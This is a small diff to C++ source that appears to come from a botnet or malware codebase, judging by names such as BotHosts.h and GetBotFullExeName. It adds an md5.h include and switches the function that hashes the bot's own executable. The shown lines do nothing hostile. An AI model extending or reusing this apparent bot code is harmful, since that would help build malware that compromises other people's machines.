@@ -8,6 +8,7 @@
 #include "BotHosts.h"
 #include "StrConsts.h"
 #include "Pipes.h"
+#include "md5.h"
 
 
 //#include "DbgRpt.h"
@@ -1039,7 +1040,7 @@ string BOT::BotExeMD5()
 {
 	string FileName = BOT::GetBotFullExeName();
 
-	string Result = CalcFileMD5Hash2(FileName.t_str());
+	string Result = CalcFileMD5Hash(FileName.t_str());
 
 	if (Result.IsEmpty())
 	{
